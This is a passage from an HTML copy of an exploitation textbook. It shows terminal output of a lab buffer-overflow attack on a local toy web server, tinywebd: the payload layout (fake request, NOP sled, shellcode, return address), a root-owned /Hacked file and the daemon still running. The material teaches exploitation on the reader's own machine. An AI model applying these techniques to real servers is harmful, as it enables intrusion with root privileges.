0pt;line-height: 107%;text-align: left;">[Fake Request (15 b)] [NOP (348 b)] [shellcode (53 b)] [ret addr (128 b)] localhost [127.0.0.1] 80 (www) open</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ls -l /Hacked</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-rw------- 1 root reader 0 2007-09-19 20:37 /Hacked reader@hacking:~/booksrc $ ps aux | grep tinywebd</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">26787 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">420 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">20:37</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinywebd</p></td></tr><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">26828 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/1</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">20:38</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinywebd</p></td></tr></table><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./webserver_id 127.0.0.1 The web server for 127.0.0.1 is Tiny webserver reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1054.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part140.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part142.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
